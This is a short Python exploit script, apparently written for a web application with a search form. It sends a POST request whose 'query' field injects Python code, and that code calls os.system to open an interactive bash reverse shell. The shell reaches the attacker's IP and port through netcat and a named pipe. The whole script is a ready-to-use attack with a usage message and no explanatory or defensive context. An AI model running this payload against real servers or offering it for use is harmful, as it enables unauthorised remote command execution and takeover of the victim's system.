#!/bin/env python3

import requests
import sys

def main():
    victim_url = sys.argv[1]
    attacker_ip = sys.argv[2]
    attacker_port = sys.argv[3]

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    data = f'engine=Google&query=a\',+__import__("os").system("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/bash+-i+2>%261|nc+{attacker_ip}+{attacker_port}+>/tmp/f"))%23'
    
    response = requests.post(f'{victim_url}', headers=headers, data=data)

try:
    main()
except:
    print(f"""
    Usage:
        {sys.argv[0]} victim_url attacker_ip attacker_port
    """)
